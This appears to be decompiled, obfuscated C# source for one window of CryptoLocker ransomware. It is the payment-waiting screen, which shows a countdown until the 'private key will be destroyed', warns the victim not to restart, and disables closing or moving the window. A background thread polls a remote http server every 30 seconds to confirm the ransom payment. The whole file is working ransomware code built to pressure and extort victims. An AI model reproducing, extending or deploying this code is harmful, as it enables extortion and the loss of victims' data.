using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Final
{
	public class Form3 : Form
	{
		private GClass0 gclass0_0 = new GClass0();

		private string string_0;

		private Thread thread_0;

		private System.Windows.Forms.Timer timer_0 = Delegate15.smethod_0();

		private IContainer icontainer_0;

		private PictureBox pictureBox_0;

		private Label label_0;

		private Label label_1;

		private Label label_2;

		private Label label_3;

		private Label label_4;

		private Label label_5;

		private Label label_6;

		private Label label_7;

		private Button button_0;

		private System.Windows.Forms.Timer timer_1;

		private Label label_8;

		private Label label_9;

		private Label label_10;

		private Label label_11;

		private Label label_12;

		private Label label_13;

		private Panel panel_0;

		private Label label_14;

		private Label label_15;

		private ProgressBar progressBar_0;

		private Label label_16;

		private Label label_17;

		private Label label_18;

		private Label label_19;

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = Delegate85.smethod_0(this);
				Delegate87.smethod_0(createParams, Delegate86.smethod_0(createParams) | 512);
				return createParams;
			}
		}

		public Form3()
		{
			this.method_6();
		}

		protected override void WndProc(ref Message m)
		{
			if (m.Msg == 274 && m.WParam.ToInt32() == 61456)
			{
				return;
			}
			if (m.Msg == 161 && m.WParam.ToInt32() == 2)
			{
				return;
			}
			Delegate84.smethod_0(this, ref m);
		}

		private void method_0()
		{
			Delegate83.smethod_2(this.button_0, false);
			Delegate41.smethod_6(this.label_18);
		}

		private void method_1()
		{
			Delegate41.smethod_6(this.progressBar_0);
			Delegate83.smethod_2(this.button_0, true);
			Delegate41.smethod_4(this.label_18);
		}

		private void method_2()
		{
			bool flag = false;
			while (!flag)
			{
				if (this.gclass0_0.method_2(this.string_0, 3))
				{
					flag = true;
					this.method_1();
				}
				Delegate104.smethod_0(30000);
			}
		}

		private void method_3(object sender, EventArgs e)
		{
			this.string_0 = Delegate88.smethod_0("http://", this.gclass0_0.method_4(), "/");
			this.gclass0_0.method_15(this.string_0);
			this.gclass0_0.dateTime_0 = Delegate89.smethod_0().AddSeconds((double)this.gclass0_0.int_0);
			Delegate90.smethod_0(this.timer_0, 1000);
			Delegate60.smethod_0(this.timer_0, new EventHandler(this.method_4));
			Delegate91.smethod_0(this.timer_0);
			Delegate54.smethod_0(this.label_1, this.gclass0_0.dateTime_0.ToString());
			Delegate102.smethod_0(this.progressBar_0, 30);
			this.method_0();
			this.thread_0 = Delegate16.smethod_0(new ThreadStart(this.method_7));
			Delegate103.smethod_0(this.thread_0);
		}

		private void method_4(object sender, EventArgs e)
		{
			this.gclass0_0.int_0--;
			TimeSpan timeSpan = Delegate93.smethod_0((double)this.gclass0_0.int_0);
			if (this.gclass0_0.int_0 < 0)
			{
				Delegate91.smethod_1(this.timer_0);
				return;
			}
			Delegate54.smethod_0(this.label_17, timeSpan.Days.ToString());
			Delegate54.smethod_0(this.label_3, timeSpan.Hours.ToString());
			Delegate54.smethod_0(this.label_5, timeSpan.Minutes.ToString());
			Delegate54.smethod_0(this.label_7, timeSpan.Seconds.ToString());
		}

		private void method_5(object sender, EventArgs e)
		{
			Delegate83.smethod_2(this.button_0, false);
			Form4 object_ = new Form4();
			Delegate41.smethod_4(object_);
			Delegate41.smethod_5(this);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
			Delegate40.smethod_0(this, disposing);
		}

		private void method_6()
		{
			ComponentResourceManager object_ = Delegate2.smethod_0(Delegate38.smethod_0(typeof(Form3).TypeHandle));
			this.pictureBox_0 = Delegate3.smethod_0();
			this.label_0 = Delegate4.smethod_0();
			this.label_1 = Delegate4.smethod_0();
			this.label_2 = Delegate4.smethod_0();
			this.label_3 = Delegate4.smethod_0();
			this.label_4 = Delegate4.smethod_0();
			this.label_5 = Delegate4.smethod_0();
			this.label_6 = Delegate4.smethod_0();
			this.label_7 = Delegate4.smethod_0();
			this.button_0 = Delegate5.smethod_0();
			this.label_8 = Delegate4.smethod_0();
			this.label_9 = Delegate4.smethod_0();
			this.label_10 = Delegate4.smethod_0();
			this.label_11 = Delegate4.smethod_0();
			this.label_12 = Delegate4.smethod_0();
			this.label_13 = Delegate4.smethod_0();
			this.panel_0 = Delegate7.smethod_0();
			this.label_19 = Delegate4.smethod_0();
			this.label_18 = Delegate4.smethod_0();
			this.progressBar_0 = Delegate18.smethod_0();
			this.label_15 = Delegate4.smethod_0();
			this.label_14 = Delegate4.smethod_0();
			this.label_16 = Delegate4.smethod_0();
			this.label_17 = Delegate4.smethod_0();
			((ISupportInitialize)this.pictureBox_0).BeginInit();
			Delegate41.smethod_0(this.panel_0);
			Delegate41.smethod_1(this);
			Delegate42.smethod_0(this.pictureBox_0, null);
			Delegate42.smethod_1(this.pictureBox_0, (Image)Delegate43.smethod_0(object_, "pictureBox1.Image"));
			Delegate44.smethod_0(this.pictureBox_0, Delegate11.smethod_0(12, 57));
			Delegate45.smethod_0(this.pictureBox_0, "pictureBox1");
			Delegate46.smethod_0(this.pictureBox_0, Delegate12.smethod_0(255, 258));
			Delegate47.smethod_0(this.pictureBox_0, 2);
			Delegate48.smethod_0(this.pictureBox_0, false);
			Delegate49.smethod_0(this.label_0, true);
			Delegate50.smethod_0(this.label_0, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_0, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_0, Delegate11.smethod_0(66, 318));
			Delegate45.smethod_0(this.label_0, "label2");
			Delegate46.smethod_0(this.label_0, Delegate12.smethod_0(161, 14));
			Delegate53.smethod_0(this.label_0, 3);
			Delegate54.smethod_0(this.label_0, "Private key will be destroyed on");
			Delegate49.smethod_0(this.label_1, true);
			Delegate50.smethod_0(this.label_1, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_1, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_1, Delegate11.smethod_0(84, 334));
			Delegate45.smethod_0(this.label_1, "label3");
			Delegate46.smethod_0(this.label_1, Delegate12.smethod_0(126, 14));
			Delegate53.smethod_0(this.label_1, 4);
			Delegate54.smethod_0(this.label_1, "12/13/2013 00:00:00 PM");
			Delegate49.smethod_0(this.label_2, true);
			Delegate50.smethod_0(this.label_2, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_2, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_2, Delegate11.smethod_0(120, 384));
			Delegate45.smethod_0(this.label_2, "label5");
			Delegate46.smethod_0(this.label_2, Delegate12.smethod_0(47, 14));
			Delegate53.smethod_0(this.label_2, 6);
			Delegate54.smethod_0(this.label_2, "Time left");
			Delegate49.smethod_0(this.label_3, true);
			Delegate50.smethod_0(this.label_3, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_3, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_3, Delegate11.smethod_0(110, 400));
			Delegate45.smethod_0(this.label_3, "label6");
			Delegate46.smethod_0(this.label_3, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_3, 7);
			Delegate54.smethod_0(this.label_3, "00");
			Delegate49.smethod_0(this.label_4, true);
			Delegate50.smethod_0(this.label_4, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_4, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_4, Delegate11.smethod_0(140, 400));
			Delegate45.smethod_0(this.label_4, "label7");
			Delegate46.smethod_0(this.label_4, Delegate12.smethod_0(17, 24));
			Delegate53.smethod_0(this.label_4, 8);
			Delegate54.smethod_0(this.label_4, ":");
			Delegate49.smethod_0(this.label_5, true);
			Delegate50.smethod_0(this.label_5, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_5, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_5, Delegate11.smethod_0(155, 400));
			Delegate45.smethod_0(this.label_5, "label8");
			Delegate46.smethod_0(this.label_5, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_5, 9);
			Delegate54.smethod_0(this.label_5, "00");
			Delegate49.smethod_0(this.label_6, true);
			Delegate50.smethod_0(this.label_6, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_6, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_6, Delegate11.smethod_0(185, 400));
			Delegate45.smethod_0(this.label_6, "label9");
			Delegate46.smethod_0(this.label_6, Delegate12.smethod_0(17, 24));
			Delegate53.smethod_0(this.label_6, 10);
			Delegate54.smethod_0(this.label_6, ":");
			Delegate49.smethod_0(this.label_7, true);
			Delegate50.smethod_0(this.label_7, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_7, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_7, Delegate11.smethod_0(198, 400));
			Delegate45.smethod_0(this.label_7, "label10");
			Delegate46.smethod_0(this.label_7, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_7, 11);
			Delegate54.smethod_0(this.label_7, "00");
			Delegate52.smethod_1(this.button_0, Delegate51.smethod_2());
			Delegate56.smethod_0(Delegate55.smethod_0(this.button_0), 0);
			Delegate57.smethod_0(this.button_0, FlatStyle.Flat);
			Delegate50.smethod_0(this.button_0, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.button_0, Delegate51.smethod_0());
			Delegate44.smethod_0(this.button_0, Delegate11.smethod_0(566, 520));
			Delegate45.smethod_0(this.button_0, "button1");
			Delegate46.smethod_0(this.button_0, Delegate12.smethod_0(140, 39));
			Delegate53.smethod_0(this.button_0, 13);
			Delegate54.smethod_0(this.button_0, "Next >>");
			Delegate58.smethod_0(this.button_0, false);
			Delegate59.smethod_0(this.button_0, new EventHandler(this.method_5));
			Delegate49.smethod_0(this.label_8, true);
			Delegate52.smethod_1(this.label_8, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_8, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_8, Delegate11.smethod_0(364, 105));
			Delegate45.smethod_0(this.label_8, "label11");
			Delegate46.smethod_0(this.label_8, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_8, 22);
			Delegate49.smethod_0(this.label_9, true);
			Delegate52.smethod_1(this.label_9, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_9, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_9, Delegate11.smethod_0(344, 135));
			Delegate45.smethod_0(this.label_9, "label12");
			Delegate46.smethod_0(this.label_9, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_9, 23);
			Delegate49.smethod_0(this.label_10, true);
			Delegate52.smethod_1(this.label_10, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_10, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_10, Delegate11.smethod_0(305, 164));
			Delegate45.smethod_0(this.label_10, "label13");
			Delegate46.smethod_0(this.label_10, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_10, 24);
			Delegate49.smethod_0(this.label_11, true);
			Delegate52.smethod_1(this.label_11, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_11, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_11, Delegate11.smethod_0(341, 192));
			Delegate45.smethod_0(this.label_11, "label14");
			Delegate46.smethod_0(this.label_11, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_11, 25);
			Delegate49.smethod_0(this.label_12, true);
			Delegate52.smethod_1(this.label_12, Delegate51.smethod_0());
			Delegate50.smethod_0(this.label_12, Delegate13.smethod_0("Arial", 12f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_12, Delegate11.smethod_0(321, 251));
			Delegate45.smethod_0(this.label_12, "label16");
			Delegate46.smethod_0(this.label_12, Delegate12.smethod_0(0, 19));
			Delegate53.smethod_0(this.label_12, 27);
			Delegate49.smethod_0(this.label_13, true);
			Delegate50.smethod_0(this.label_13, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_13, Delegate51.smethod_0());
			Delegate44.smethod_0(this.label_13, Delegate11.smethod_0(336, 25));
			Delegate45.smethod_0(this.label_13, "label1");
			Delegate46.smethod_0(this.label_13, Delegate12.smethod_0(317, 24));
			Delegate53.smethod_0(this.label_13, 0);
			Delegate54.smethod_0(this.label_13, "Waiting for payment activation");
			Delegate52.smethod_1(this.panel_0, Delegate51.smethod_0());
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_19);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_18);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.progressBar_0);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_15);
			Delegate62.smethod_0(Delegate61.smethod_0(this.panel_0), this.label_14);
			Delegate44.smethod_0(this.panel_0, Delegate11.smethod_0(274, 57));
			Delegate45.smethod_0(this.panel_0, "panel1");
			Delegate46.smethod_0(this.panel_0, Delegate12.smethod_0(432, 450));
			Delegate53.smethod_0(this.panel_0, 29);
			Delegate49.smethod_0(this.label_19, true);
			Delegate50.smethod_0(this.label_19, Delegate13.smethod_0("Arial", 14.25f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_19, Delegate51.smethod_4());
			Delegate44.smethod_0(this.label_19, Delegate11.smethod_0(43, 325));
			Delegate45.smethod_0(this.label_19, "label18");
			Delegate46.smethod_0(this.label_19, Delegate12.smethod_0(349, 22));
			Delegate53.smethod_0(this.label_19, 4);
			Delegate54.smethod_0(this.label_19, "Please do not restart your computer!");
			Delegate109.smethod_0(this.label_19, ContentAlignment.TopCenter);
			Delegate49.smethod_0(this.label_18, true);
			Delegate50.smethod_0(this.label_18, Delegate13.smethod_0("Arial", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_18, Delegate11.smethod_0(26, 213));
			Delegate45.smethod_0(this.label_18, "label17");
			Delegate46.smethod_0(this.label_18, Delegate12.smethod_0(291, 16));
			Delegate53.smethod_0(this.label_18, 3);
			Delegate54.smethod_0(this.label_18, "Payment was received. Please Click Next >>");
			Delegate109.smethod_0(this.label_18, ContentAlignment.TopCenter);
			Delegate44.smethod_0(this.progressBar_0, Delegate11.smethod_0(29, 168));
			Delegate45.smethod_0(this.progressBar_0, "progressBar1");
			Delegate46.smethod_0(this.progressBar_0, Delegate12.smethod_0(377, 23));
			Delegate105.smethod_0(this.progressBar_0, ProgressBarStyle.Marquee);
			Delegate53.smethod_0(this.progressBar_0, 2);
			Delegate49.smethod_0(this.label_15, true);
			Delegate50.smethod_0(this.label_15, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_15, Delegate11.smethod_0(26, 48));
			Delegate45.smethod_0(this.label_15, "label15");
			Delegate46.smethod_0(this.label_15, Delegate12.smethod_0(380, 14));
			Delegate53.smethod_0(this.label_15, 1);
			Delegate54.smethod_0(this.label_15, "The private key destruction is suspended for the time of payment processing.");
			Delegate109.smethod_0(this.label_15, ContentAlignment.TopCenter);
			Delegate49.smethod_0(this.label_14, true);
			Delegate50.smethod_0(this.label_14, Delegate13.smethod_0("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0));
			Delegate44.smethod_0(this.label_14, Delegate11.smethod_0(26, 11));
			Delegate45.smethod_0(this.label_14, "label4");
			Delegate46.smethod_0(this.label_14, Delegate12.smethod_0(388, 28));
			Delegate53.smethod_0(this.label_14, 0);
			Delegate54.smethod_0(this.label_14, "Payments are processed manually, therefore, the expectation of activation may\r\ntake up to 48 hours.");
			Delegate109.smethod_0(this.label_14, ContentAlignment.TopCenter);
			Delegate49.smethod_0(this.label_16, true);
			Delegate50.smethod_0(this.label_16, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_16, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_16, Delegate11.smethod_0(84, 400));
			Delegate45.smethod_0(this.label_16, "label26");
			Delegate46.smethod_0(this.label_16, Delegate12.smethod_0(29, 24));
			Delegate53.smethod_0(this.label_16, 35);
			Delegate54.smethod_0(this.label_16, "d.");
			Delegate49.smethod_0(this.label_17, true);
			Delegate50.smethod_0(this.label_17, Delegate13.smethod_0("Arial", 15.75f, FontStyle.Bold, GraphicsUnit.Point, 0));
			Delegate52.smethod_0(this.label_17, Delegate51.smethod_1());
			Delegate44.smethod_0(this.label_17, Delegate11.smethod_0(54, 400));
			Delegate45.smethod_0(this.label_17, "label25");
			Delegate46.smethod_0(this.label_17, Delegate12.smethod_0(34, 24));
			Delegate53.smethod_0(this.label_17, 34);
			Delegate54.smethod_0(this.label_17, "00");
			Delegate73.smethod_0(this, Delegate14.smethod_0(6f, 13f));
			Delegate74.smethod_0(this, AutoScaleMode.Font);
			Delegate52.smethod_1(this, Delegate51.smethod_4());
			Delegate75.smethod_0(this, Delegate12.smethod_0(721, 573));
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_16);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_17);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.panel_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_12);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_11);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_10);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_9);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_8);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.button_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_7);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_6);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_5);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_4);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_3);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_2);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_1);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.pictureBox_0);
			Delegate62.smethod_0(Delegate61.smethod_1(this), this.label_13);
			Delegate77.smethod_0(this, Delegate76.smethod_0());
			Delegate78.smethod_0(this, FormBorderStyle.Fixed3D);
			Delegate79.smethod_0(this, (Icon)Delegate43.smethod_0(object_, "$this.Icon"));
			Delegate80.smethod_0(this, false);
			Delegate80.smethod_1(this, false);
			Delegate45.smethod_1(this, "Form3");
			Delegate80.smethod_2(this, false);
			Delegate81.smethod_0(this, FormStartPosition.CenterScreen);
			Delegate54.smethod_0(this, "CryptoLocker");
			Delegate82.smethod_0(this, new EventHandler(this.method_3));
			((ISupportInitialize)this.pictureBox_0).EndInit();
			Delegate83.smethod_0(this.panel_0, false);
			Delegate41.smethod_2(this.panel_0);
			Delegate83.smethod_1(this, false);
			Delegate41.smethod_3(this);
		}

		[CompilerGenerated]
		private void method_7()
		{
			this.method_2();
		}
	}
}
